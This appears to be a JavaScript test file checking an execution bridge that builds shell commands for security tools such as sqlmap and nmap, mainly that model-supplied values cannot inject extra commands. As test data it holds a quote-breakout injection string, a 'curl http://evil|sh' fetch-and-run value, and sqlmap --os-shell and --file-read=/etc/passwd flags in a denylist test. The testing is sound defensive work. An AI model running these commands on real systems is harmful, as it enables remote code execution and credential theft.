/**
 * test-arsenal-tools.mjs — guard for the execution bridge (scripts/arsenal-tools.mjs).
 *
 * The bridge hands shell-command STRINGS to the hunter's bashTool. The one thing that must
 * NEVER regress: a value the model controls cannot break out of its single-quoted slot and
 * inject a second command. Plus structural sanity (schema name == key, valid function-tool
 * shape, group/selection resolution). Run: `npm run test:arsenal-tools`.
 */
import { execFileSync } from 'node:child_process';
import { ARSENAL, GROUPS, selectArsenal, q } from './arsenal-tools.mjs';

let pass = 0, fail = 0;
const ok = (label, cond, detail) =>
  (cond ? (pass++, console.log(`  ✅ ${label}${detail ? ` — ${detail}` : ''}`))
        : (fail++, console.log(`  ❌ ${label}${detail ? ` — ${detail}` : ''}`)));

// ── 1. structural sanity ────────────────────────────────────────────────────
ok('arsenal non-empty', Object.keys(ARSENAL).length >= 10, `${Object.keys(ARSENAL).length} tools`);
for (const [name, entry] of Object.entries(ARSENAL)) {
  const s = entry.schema;
  ok(`schema shape: ${name}`,
    s && s.type === 'function' && s.function && s.function.parameters?.type === 'object' && Array.isArray(s.function.parameters.required));
  ok(`schema name matches key: ${name}`, s.function.name === name, s.function.name);
  ok(`build() returns string: ${name}`, typeof entry.build === 'function');
  // every required param must appear in properties
  const props = Object.keys(s.function.parameters.properties || {});
  const missing = (s.function.parameters.required || []).filter(r => !props.includes(r));
  ok(`required ⊆ properties: ${name}`, missing.length === 0, missing.length ? `missing ${missing}` : 'ok');
}

// ── 2. builders produce a non-empty command containing the binary ─────────────
const sampleArgs = {
  httpx: { url: 'http://127.0.0.1:9100' },
  subfinder: { domain: 'example.com' },
  katana: { url: 'http://127.0.0.1:9100' },
  nmap: { target: '127.0.0.1', ports: '1-1000' },
  ffuf: { url: 'http://127.0.0.1:9100/FUZZ', wordlist: '/tmp/w.txt' },
  gobuster: { url: 'http://127.0.0.1:9100', wordlist: '/tmp/w.txt' },
  feroxbuster: { url: 'http://127.0.0.1:9100' },
  dalfox: { url: 'http://127.0.0.1:9100/?q=1' },
  sqlmap: { url: 'http://127.0.0.1:9100/i?id=1' },
  nikto: { url: 'http://127.0.0.1:9100' },
  nuclei: { url: 'http://127.0.0.1:9100', tags: 'cve,xss' },
  john: { hashfile: '/tmp/h.txt' },
  hashcat: { hashfile: '/tmp/h.txt', wordlist: '/tmp/w.txt', mode: 0 },
  semgrep: {},
  gitleaks: {},
  trufflehog: {},
  trivy: { target: '.' },
};
for (const [name, entry] of Object.entries(ARSENAL)) {
  const cmd = entry.build(sampleArgs[name] || {});
  ok(`build non-empty + names binary: ${name}`, typeof cmd === 'string' && cmd.includes(name), cmd.slice(0, 60));
}

// ── 3. INJECTION SAFETY — the contract that must never break ──────────────────
// REAL-BASH round-trip: the ground truth. A malicious value, once q()'d and handed to
// `bash -lc`, must be received by the program as ONE literal argument — if the quoting
// leaked, bash would run the injected `echo INJECTED` and the output would differ.
const PAYLOAD = `x'; echo INJECTED #`;
let rt = '';
try { rt = execFileSync('bash', ['-lc', `printf %s ${q(PAYLOAD)}`], { encoding: 'utf8' }); }
catch (e) { rt = `[err:${e.message}]`; }
ok('injection: q() round-trips through real bash (single literal arg)', rt === PAYLOAD, JSON.stringify(rt));
// structural: the escaped-quote idiom is present when a value contains a quote
ok('injection: url stays quoted', ARSENAL.httpx.build({ url: PAYLOAD }).includes(`'\\''`), 'escaped embedded quote present');

// q() round-trip: every single quote is neutralised
const escaped = q(`a'b'c`);
ok('q() escapes every quote', escaped === `'a'\\''b'\\''c'`, escaped);

// sqlmap.extra sanitizer must drop shell metacharacters
const evilExtra = ARSENAL.sqlmap.build({ url: 'http://127.0.0.1/a?id=1', extra: '--dbs; curl http://evil|sh && whoami' });
ok('sqlmap extra: no shell metachars survive', !/[;|&`$<>]/.test(stripQuoted(evilExtra)), evilExtra.slice(0, 80));

// ── 4. selection / groups ─────────────────────────────────────────────────────
ok('selectArsenal("") empty', selectArsenal('').length === 0);
ok('selectArsenal("web") = web family', selectArsenal('web').length === GROUPS.web.length && GROUPS.web.length > 0);
ok('selectArsenal ignores unknown', selectArsenal('dalfox,__nope__').map(t => t.name).join(',') === 'dalfox');
ok('selectArsenal ignores prototype-name tokens (no throw)',
  (() => { try { return selectArsenal('toString,valueOf,constructor,hasOwnProperty,__proto__,dalfox').map(t => t.name).join(',') === 'dalfox'; } catch { return false; } })());
ok('sqlmap denylists --os-shell / --file-read', (() => {
  const c = ARSENAL.sqlmap.build({ url: 'http://127.0.0.1/a?id=1', extra: '--os-shell --file-read=/etc/passwd --dbs' });
  return !/--os-shell/.test(c) && !/--file-read/.test(c) && /--dbs/.test(c);
})());
ok('selectArsenal dedupes group+name', selectArsenal('web,dalfox').length === GROUPS.web.length);
ok('selectArsenal("all") = full arsenal', selectArsenal('all').length === Object.keys(ARSENAL).length);

/** Remove every single-quoted region, leaving only the parts the shell would interpret. */
function stripQuoted(cmd) {
  return cmd.replace(/'(?:[^'\\]|\\.)*'/g, '');
}

console.log(`\n${fail === 0 ? '✅ ALL PASS' : `❌ ${fail} FAILED`} — ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
